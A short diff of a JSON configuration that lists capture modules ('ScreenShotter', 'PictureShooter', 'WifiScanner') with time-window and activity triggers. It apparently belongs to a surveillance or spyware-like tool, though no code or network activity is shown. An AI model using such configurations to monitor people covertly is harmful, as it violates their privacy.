@@ -1,30 +1,24 @@
 {
     "modules": [
         {
-            "module_name": "SysInfo",
-            "condition": {
-                "operating_system": "Windows"
-            }
-        },
-        {
             "module_name": "WifiScanner",
             "condition": {
                 "network_type": "WiFi"
             }
         },
         {
-            "module_name": "PictureShooter",
+            "module_name": "ScreenShotter",
             "condition": {
                 "time_range": {
                     "start": "08:00",
-                    "end": "18:00"
+                    "end": "22:00"
                 }
             }
         },
         {
-            "module_name": "ScreenShotter",
+            "module_name": "PictureShooter",
             "condition": {
-                "connected_devices": ["USB Drive", "Bluetooth Device"]
+                "active": true
             }
         }
 
